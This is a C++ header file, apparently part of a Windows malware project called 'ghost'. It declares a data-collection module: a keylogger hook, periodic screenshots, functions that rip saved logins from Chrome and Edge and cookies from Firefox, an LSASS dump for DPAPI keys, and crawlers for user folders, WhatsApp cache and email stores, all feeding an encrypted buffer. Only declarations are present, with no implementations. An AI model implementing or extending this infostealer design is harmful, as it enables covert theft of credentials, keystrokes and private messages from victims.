#pragma once

#include <windows.h>
#include <string>
#include <vector>
#include <atomic>
#include <mutex>   
#include <cstdint> 
#include "../core/ghost_core.h"

namespace ghost {
namespace collector {

extern std::atomic<bool> g_CollectionActive;

void StartCollectionThreads();

void StopCollectionThreads();

extern std::vector<uint8_t> g_EncryptedBuffer;
extern std::mutex g_BufferMutex;

void AppendToBuffer(const uint8_t* data, size_t len);

namespace keylog {
    bool InstallHook();
    void UninstallHook();
}

namespace screenshot {
    void PeriodicCaptureThread();
}

namespace creds {
    bool RipChromeLogins();
    bool RipEdgeLogins();
    bool RipFirefoxCookies();
    bool DumpLsassForDPAPIKeys();
}

namespace files {
    void CrawlUserDirs();
    void ScanWhatsAppCache();
    void ScanEmailStores();
}

} 
}